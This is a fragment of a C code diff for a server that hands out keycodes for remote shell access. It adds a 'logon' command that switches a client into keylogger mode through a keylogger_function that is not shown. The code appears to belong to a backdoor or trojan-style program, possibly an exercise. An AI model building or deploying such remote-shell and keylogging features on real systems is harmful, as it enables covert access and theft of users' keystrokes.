@@ -40,8 +40,7 @@ bool	check_server_password(t_server *server, char *input)
 	return (false);
 }
 
-void	handle_handshake(t_server *server, int index, char *input)
-{
+void	handle_handshake(t_server *server, int index, char *input) {
 	t_client *const	client = &server->clients[index];
 
 	if (client->status == HANDSHAKE)
@@ -59,20 +58,19 @@ void	handle_handshake(t_server *server, int index, char *input)
 		}
 		ft_dprintf(2, "Valid KEY\n");
 		client->status = CONNECTED;
+	add2buffer(&server->clients[index], ft_strdup("$> "));
 	}
-	send(client->fd, "$> ", 3, 0);
 }
 
 void	add_password(t_server *server, int index)
 {
-	const int	client_fd = server->clients[index].fd;
 	char		*password = gen_random_password();
 	t_list		*new_node = ft_lstnew(password);
 	char		msg_connection[300] = {0};
 
 	ft_lstadd_back(&server->passwords, new_node);
 	sprintf(msg_connection, "To access the remote shell, use the next Keycode -> [%s]\n", password);
-	send(client_fd, msg_connection, strlen(msg_connection), 0);
+	add2buffer(&server->clients[index], ft_strdup(msg_connection));
 }
 
 void	delete_client(t_server *server, int index)
@@ -86,23 +84,30 @@ void	delete_client(t_server *server, int index)
 
 int	handle_commands(t_server *server, int index, char *input)
 {
-	const t_client	*client = &server->clients[index];
+	t_client	*client = &server->clients[index];
 
 	if (strcmp("clear", input) == 0)
 	{
-		send(client->fd, CLEAR_CODE, sizeof(CLEAR_CODE), 0);
+		add2buffer(&server->clients[index], ft_strdup(CLEAR_CODE));
 	}
 	else if (strcmp("shell", input) == 0)
 	{
 		ft_dprintf(2, "client_fd: %d\n", client->fd);
 		add_password(server, index);
-		delete_client(server, index);
+		client->disconnect = true;
+		//delete_client(server, index);
+	}
+	else if (strcmp("logon", input) == 0)
+	{
+		client->status = KEYLOGGER;
+		keylogger_function(server, index);
+		return (0);
 	}
 	else if (strcmp("?", input) == 0 || strcmp("help", input) == 0)
 	{
-		send(client->fd, HELP, sizeof(HELP), 0);
+		add2buffer(&server->clients[index], ft_strdup(HELP));
 	}
-	send(client->fd, "$> ", 3, 0);
+	add2buffer(client, ft_strdup("$> "));
 	return (0);
 }
 
